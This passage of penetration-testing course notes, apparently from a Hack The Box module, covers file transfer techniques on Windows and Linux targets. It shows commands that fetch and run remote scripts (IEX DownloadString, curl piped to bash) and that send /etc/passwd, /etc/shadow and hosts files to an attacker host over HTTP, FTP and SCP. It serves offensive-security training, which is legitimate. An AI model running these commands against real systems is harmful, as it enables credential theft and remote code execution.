Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
Now we can use a PowerShell script PSUpload.ps1
```
https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1
```
which uses Invoke-WebRequest to perform the upload operations. The script accepts two parameters -File, which we use to specify the file path, and -Uri, the server URL where we'll upload our file. Let's attempt to upload the host file from our Windows host.

### PowerShell Script to Upload a File to Python Upload Server
```
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
```

### PowerShell Base64 Web Upload
Another way to use PowerShell and base64 encoded files for upload operations is by using Invoke-WebRequest or Invoke-RestMethod together with Netcat. We use Netcat to listen in on a port we specify and send the file as a POST request. Finally, we copy the output and use the base64 decode function to convert the base64 string into a file.
```
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```
We catch the base64 data with Netcat and use the base64 application with the decode option to convert the string to the file.
```
Suljov@htb[/htb]$ nc -lvnp 8000
Suljov@htb[/htb]$ echo <base64> | base64 -d -w 0 > hosts
```

### SMB Uploads
We previously discussed that companies usually allow outbound traffic using HTTP (TCP/80) and HTTPS (TCP/443) protocols. Commonly enterprises don't allow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential attacks. For more information on this, we can read the Microsoft post Preventing SMB traffic from lateral connections and entering or leaving the network.
```
https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a
```
An alternative is to run SMB over HTTP with WebDav. WebDAV (RFC 4918)
```
https://datatracker.ietf.org/doc/html/rfc4918
```
is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other. The WebDAV protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. WebDAV can also use HTTPS.

When you use SMB, it will first attempt to connect using the SMB protocol, and if there's no SMB share available, it will try to connect using HTTP. In the following Wireshark capture, we attempt to connect to the file share testing3, and because it didn't find anything with SMB, it uses HTTP.

![image](https://user-images.githubusercontent.com/24814781/182876700-49439eaa-3521-451b-9ab9-14671028224f.png)

### Configuring WebDav Server
To set up our WebDav server, we need to install two Python modules, wsgidav and cheroot (you can read more about this implementation here: wsgidav github)
```
https://github.com/mar10/wsgidav
```
After installing them, we run the wsgidav application in the target directory.

### Installing WebDav Python modules
```
Suljov@htb[/htb]$ sudo pip install wsgidav cheroot

[sudo] password for plaintext: 
Collecting wsgidav
  Downloading WsgiDAV-4.0.1-py3-none-any.whl (171 kB)
     |████████████████████████████████| 171 kB 1.4 MB/s
     ...SNIP...
```
### Using the WebDav Python module
```
Suljov@htb[/htb]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 

[sudo] password for plaintext: 
Running without configuration file.
10:02:53.949 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
10:02:53.950 - INFO    : WsgiDAV/4.0.1 Python/3.9.2 Linux-5.15.0-15parrot1-amd64-x86_64-with-glibc2.31
10:02:53.950 - INFO    : Lock manager:      LockManager(LockStorageDict)
10:02:53.950 - INFO    : Property manager:  None
10:02:53.950 - INFO    : Domain controller: SimpleDomainController()
10:02:53.950 - INFO    : Registered DAV providers by route:
10:02:53.950 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/usr/local/lib/python3.9/dist-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
10:02:53.950 - INFO    :   - '/': FilesystemProvider for path '/tmp' (Read-Write) (anonymous)
10:02:53.950 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
10:02:53.950 - WARNING : Share '/' will allow anonymous write access.
10:02:53.950 - WARNING : Share '/:dir_browser' will allow anonymous read access.
10:02:54.194 - INFO    : Running WsgiDAV/4.0.1 Cheroot/8.6.0 Python 3.9.2
10:02:54.194 - INFO    : Serving on http://0.0.0.0:80 ...
```

### Connecting to the Webdav Share
Now we can attempt to connect to the share using the DavWWWRoot directory.
```
C:\htb> dir \\192.168.49.128\DavWWWRoot

 Volume in drive \\192.168.49.128\DavWWWRoot has no label.
 Volume Serial Number is 0000-0000

 Directory of \\192.168.49.128\DavWWWRoot

05/18/2022  10:05 AM    <DIR>          .
05/18/2022  10:05 AM    <DIR>          ..
05/18/2022  10:05 AM    <DIR>          sharefolder
05/18/2022  10:05 AM                13 filetest.txt
               1 File(s)             13 bytes
               3 Dir(s)  43,443,318,784 bytes free
```



Note: DavWWWRoot is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.

You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \192.168.49.128\sharefolder

### Uploading Files using SMB
```
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

Note: If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.

### FTP Uploads

Uploading files using FTP is very similar to downloading files. We can use PowerShell or the FTP client to complete the operation. Before we start our FTP Server using the Python module pyftpdlib, we need to specify the option --write to allow clients to upload files to our attack host.
```
Suljov@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write

/usr/local/lib/python3.9/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
  warnings.warn("write permissions assigned to anonymous user.",
[I 2022-05-18 10:33:31] concurrency model: async
[I 2022-05-18 10:33:31] masquerade (NAT) address: None
[I 2022-05-18 10:33:31] passive ports: None
[I 2022-05-18 10:33:31] >>> starting FTP server on 0.0.0.0:21, pid=5155 <<<
```
Now let's use the PowerShell upload function to upload a file to our FTP Server.
### PowerShell Upload File
```
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

### Create a Command File for the FTP Client to Upload a File
```
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```
-------------------------------------------------------------------------------------

## Linux File Transfer Methods

Linux is a versatile operating system, which commonly has many different tools we can use to perform file transfers. Understanding file transfer methods in Linux can help attackers and defenders improve their skills to attack networks and prevent sophisticated attacks.

A few years ago, we were contacted to perform incident response on some web servers. We found multiple threat actors in six out of the nine web servers we investigated. The threat actor found a SQL Injection vulnerability. They used a Bash script that, when executed, attempted to download another piece of malware that connected to the threat actor's command and control server.

The Bash script they used tried three download methods to get the other piece of malware that connected to the command and control server. Its first attempt was to use cURL. If that failed, it attempted to use wget, and if that failed, it used Python. All three methods use HTTP to communicate.

Although Linux can communicate via FTP, SMB like Windows, most malware on all different operating systems uses HTTP and HTTPS for communication.

This section will review multiple ways to transfer files on Linux, including HTTP, Bash, SSH, etc.

### Linux Download Operations

We have access to the machine NIX04, and we need to download a file from our Pwnbox machine. Let's see how we can accomplish this using multiple file download methods.

![image](https://user-images.githubusercontent.com/24814781/183630494-b4cea656-f209-4157-b458-4e25f0366d89.png)


### Base64 Encoding and Decoding


Depending on the file size we want to transfer, we can use a method that does not require network communication. If we have access to a terminal, we can encode a file to a base64 string, copy its content into the terminal and perform the reverse operation. Let's see how we can do this with Bash.


### Pwnbox - Check File MD5 hash
```
Suljov@htb[/htb]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

We use cat to print the file content, and base64 encode the output using a pipe |. We used the option -w 0 to create only one line and ended up with the command with a semi-colon (;) and echo keyword to start a new line and make it easier to copy.

### Pwnbox - Encode SSH Key to Base64
```
Suljov@htb[/htb]$ cat id_rsa |base64 -w 0;echo

LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=
```

We copy this content, paste it onto our Linux target machine, and use base64 with the option `-d' to decode it.

### Linux - Decode the File
```
Suljov@htb[/htb]$ echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d > id_rsa
```

Finally, we can confirm if the file was transferred successfully using the md5sum command.

### Linux - Confirm the MD5 Hashes Match

```
Suljov@htb[/htb]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```


Note: You can also upload files using the reverse operation. From your compromised target cat and base64 encode a file and decode it in your Pwnbox.

### Web Downloads with Wget and cURL

Two of the most common utilities in Linux distributions to interact with web applications are wget and curl. These tools are installed on many Linux distributions.

To download a file using wget, we need to specify the URL and the option `-O' to set the output filename.

### Download a File Using wget
```
Suljov@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

cURL is very similar to wget, but the output filename option is lowercase `-o'.

### Download a File Using cURL
```
Suljov@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

### Fileless Attacks Using Linux

Because of the way Linux works and how pipes operate,
```
https://www.geeksforgeeks.org/piping-in-unix-or-linux/
```
most of the tools we use in Linux can be used to replicate fileless operations, which means that we don't have to download a file to execute it.

Note: Some payloads such as mkfifo write files to disk. Keep in mind that while the execution of the payload may be fileless when you use a pipe, depending on the payload choosen it may create temporary files on the OS.

Let's take the cURL command we used, and instead of downloading LinEnum.sh, let's execute it directly using a pipe.

### Fileless Download with cURL
```
Suljov@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

Similarly, we can download a Python script file from a web server and pipe it into the Python binary. Let's do that, this time using wget.

### Fileless Download with wget
```
Suljov@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

Hello World!
```

### Download with Bash dev tcp

There may also be situations where none of the well-known file transfer tools are available. As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.

### Connect to the Target Webserver
```
Suljov@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
```

### HTTP GET Request
```
Suljov@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

### Print the Response
```
Suljov@htb[/htb]$ cat <&3
```

### SSH Downloads

SSH (or Secure Shell) is a protocol that allows secure access to remote computers. SSH implementation comes with an SCP utility for remote file transfer that, by default, uses the SSH protocol.

SCP (secure copy) is a command-line utility that allows you to copy files and directories between two hosts securely. We can copy our files from local to remote servers and from remote servers to our local machine.

SCP is very similar to copy or cp, but instead of providing a local path, we need to specify a username, the remote IP address or DNS name, and the user's credentials.

Before we begin downloading files from our target Linux machine to our Pwnbox, let's set up an SSH server in our Pwnbox.

### Enabling the SSH Server
```
Suljov@htb[/htb]$ sudo systemctl enable ssh

Synchronizing state of ssh.service with SysV service script with /lib/systemd/systemd-sysv-install.
Executing: /lib/systemd/systemd-sysv-install enable ssh
Use of uninitialized value $service in hash element at /usr/sbin/update-rc.d line 26, <DATA> line 45
...SNIP...
```

### Starting the SSH Server
```
Suljov@htb[/htb]$ sudo systemctl start ssh
```

### Checking for SSH Listening Port
```
Suljov@htb[/htb]$ netstat -lnpt

(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      - 
```

Now we can begin transferring files. We need to specify the IP address of our Pwnbox and the username and password.

### Linux - Downloading Files Using SCP
```
Suljov@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt . 
```

Note: You can create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer. 

### Upload Operations

There are also situations such as binary exploitation and packet capture analysis, where we must upload files from our target machine onto our attack host. The methods we used for downloads will also work for uploads. Let's see how we can upload files in various ways.

### Web Upload

As mentioned in the Windows File Transfer Methods section, we can use uploadserver, an extended module of the Python HTTP.Server module, which includes a file upload page. For this Linux example, let's see how we can configure the uploadserver module to use HTTPS for secure communication.

The first thing we need to do is to install the uploadserver module.

### Pwnbox - Start Web Server
```
Suljov@htb[/htb]$ python3 -m pip install --user uploadserver

Collecting uploadserver
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-2.0.1
```

Now we need to create a certificate. In this example, we are using a self-signed certificate.

### Pwnbox - Create a Self-Signed Certificate
```
Suljov@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

Generating a RSA private key
................................................................................+++++
.......+++++
writing new private key to 'server.pem'
-----
```

The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.

### Pwnbox - Start Web Server
```
Suljov@htb[/htb]$ mkdir https && cd https
```
```
Suljov@htb[/htb]$ python3 -m uploadserver 443 --server-certificate /root/server.pem

File upload available at /upload
Serving HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ...
```

Now from our compromised machine, let's upload the /etc/passwd and /etc/shadow files.

### Linux - Upload Multiple Files
```
Suljov@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

We used the option --insecure because we used a self-signed certificate that we trust.

### Alternative Web File Transfer Method

Since Linux distributions usually have Python or php installed, starting a web server to transfer files is straightforward. Also, if the server we compromised is a web server, we can move the files we want to transfer to the web server directory and access them from the web page, which means that we are downloading the file from our Pwnbox.

It is possible to stand up a web server using various languages. A compromised Linux machine may not have a web server installed. In such cases, we can use a mini web server. What they perhaps lack in security, they make up for flexibility, as the webroot location and listening ports can quickly be changed.

### Linux - Creating a Web Server with Python3
```
Suljov@htb[/htb]$ python3 -m http.server

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

### Linux - Creating a Web Server with Python2.7
```
Suljov@htb[/htb]$ python2.7 -m SimpleHTTPServer

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

### Linux - Creating a Web Server with PHP
```
Suljov@htb[/htb]$ php -S 0.0.0.0:8000

[Fri May 20 08:16:47 2022] PHP 7.4.28 Development Server (http://0.0.0.0:8000) started
```

#### Linux - Creating a Web Server with Ruby
```
Suljov@htb[/htb]$ ruby -run -ehttpd . -p8000

[2022-05-23 09:35:46] INFO  WEBrick 1.6.1
[2022-05-23 09:35:46] INFO  ruby 2.7.4 (2021-07-07) [x86_64-linux-gnu]
[2022-05-23 09:35:46] INFO  WEBrick::HTTPServer#start: pid=1705 port=8000
```

### Download the File from the Target Machine onto the Pwnbox
```

Suljov@htb[/htb]$ wget 192.168.49.128:8000/filetotransfer.txt

--2022-05-20 08:13:05--  http://192.168.49.128:8000/filetotransfer.txt
Connecting to 192.168.49.128:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 0 [text/plain]
Saving to: 'filetotransfer.txt'

filetotransfer.txt                       [ <=>                                                                  ]       0  --.-KB/s    in 0s      

2022-05-20 08:13:05 (0.00 B/s) - ‘filetotransfer.txt’ saved [0/0]
```

Note: When we start a new web server using Python or PHP, it's important to consider that inbound traffic may be blocked. We are transferring a file from our target onto our attack host, but we are not uploading the file.

### SCP Upload
We may find some companies that allow the SSH protocol (TCP/22) for outbound connections, and if that's the case, we can use an SSH server with the scp utility to upload files. Let's attempt to upload a file using the SSH protocol.

#### File Upload using SCP
```
Suljov@htb[/htb]$ scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/

plaintext@192.168.49.128's password: 
passwd    
```

Note: Remember that scp syntax is similar to cp or copy.

-------------------------------------------------------------------------------------


### Transfering Files with Code
It's common to find different programming languages installed on the machines we are targetting. Programming languages such as Python, PHP, Perl, and Ruby are commonly available in Linux distributions but can also be installed on Windows, although this is far less common.

We can use some Windows default applications, such as cscript and mshta, to execute JavaScript or VBScript code. JavaScript can also run on Linux hosts.

According to Wikipedia, there are around 700 programming languages,
```
https://en.wikipedia.org/wiki/List_of_programming_languages
```
and we can create code in any programing language, to download, upload or execute instructions to the OS. This section will provide a few examples using common programming languages.

### Python
Python is a popular programming language. Currently, version 3 is supported, but we may find servers where Python version 2.7 still exits. Python can run one-liners from an operating system command line using the option -c. Let's see some examples:

### Python 2 Download
```
Suljov@htb[/htb]$ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```
### Python 3 Download
```
Suljov@htb[/htb]$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

### PHP
PHP is also very prevalent and provides multiple file transfer methods. According to W3Techs' data,
```
https://w3techs.com/technologies/details/pl-php
```
PHP is used by 77.4% of all websites with a known server-side programming language. Although the information is not precise, and the number may be slightly lower, we will often encounter web services that use PHP when performing an offensive operation.

Let's see some examples of downloading files using PHP.

In the following example, we will use the PHP file_get_contents() module
```
https://www.php.net/manual/en/function.file-get-contents.php
```
to download content from a website combined with the file_put_contents() module
```
https://www.php.net/manual/en/function.file-put-contents.php
```
to save the file into a directory. PHP can be used to run one-liners from an operating system command line using the option -r.

### PHP Download with File_get_contents()
```
Suljov@htb[/htb]$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```
An alternative to file_get_contents() and file_put_contents() is the fpopen() module. We can use this module to open a URL, read it's content and save it into a file.
### PHP Download with Fopen()
```
Suljov@htb[/htb]$ php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

We can also send the downloaded content to a pipe instead, similar to the fileless example we executed in the previous section using cURL and wget.
### PHP Download a File and Pipe it to Bash
```
Suljov@htb[/htb]$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```
Note: The URL can be used as a filename with the @file function if the fopen wrappers have been enabled. 

### Other Languages
Ruby and Perl are other popular languages that can also be used to transfer files. These two programming languages also support running one-liners from an operating system command line using the option -e.
### Ruby - Download a File
```
Suljov@htb[/htb]$ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```
### Perl - Download a File
```
Suljov@htb[/htb]$ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```
### JavaScript¨
JavaScript is a scripting or programming language that allows you to implement complex features on web pages. Like with other programming languages, we can use it for many different things.

The following JavaScript code is based on this
```
https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068
```
post, and we can download a file using it. We'll create a file called wget.js and save the following content:
Code: javascript
```
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```
We can use the following command from a Windows command prompt or PowerShell terminal to execute our JavaScript code and download a file.
```
C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```
### VBScript
```
https://en.wikipedia.org/wiki/VBScript
```
VBScript ("Microsoft Visual Basic Scripting Edition") is an Active Scripting language developed by Microsoft that is modeled on Visual Basic. VBScript has been installed by default in every desktop release of Microsoft Windows since Windows 98.

The following VBScript example can be used based on this.
```
https://stackoverflow.com/questions/2973136/download-a-file-with-vbs
```
We'll create a file called wget.vbs and save the following content:
Code: vbscript
```
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```
We can use the following command from a Windows command prompt or PowerShell terminal to execute our VBScript code and download a file.
```
C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

### Upload Operations using Python3
If we want to upload a file, we need to understand the functions in a particular programming language to perform the upload operation. The Python3 requests module
```
https://pypi.org/project/requests/
```
allows you to send HTTP requests (GET, POST, PUT, etc.) using Python. We can use the following code if we want to upload a file to our Python3 uploadserver.
```
https://github.com/Densaugeo/uploadserver
```
### Starting the Python uploadserver Module
```
Suljov@htb[/htb]$ python3 -m uploadserver 

File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
### Uploading a File Using a Python One-liner
```
Suljov@htb[/htb]$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```
Let's divide this one-liner into multiple lines to understand each piece better.
Code: python
```
# To use the requests function, we need to import the module first.
import requests 

# Define the target URL where we will upload the file.
URL = "http://192.168.49.128:8000/upload"

# Define the file we want to read, open it and save it in a variable.
file = open("/etc/passwd","rb")

# Use a requests POST request to upload the file. 
r = requests.post(url,files={"files":file})
```
We can do the same with any other programming language. A good practice is picking one and trying to build an upload program.

-------------------------------------------------------------------------------------
## Miscellaneous File Transfer Methods


-------------------------------------------------------------------------------------
## Protected File Transfers


-------------------------------------------------------------------------------------
## Catching Files over HTTP and HTTPS


-------------------------------------------------------------------------------------
## Living off The Land


-------------------------------------------------------------------------------------
## Detection


-------------------------------------------------------------------------------------
## Evading Detection
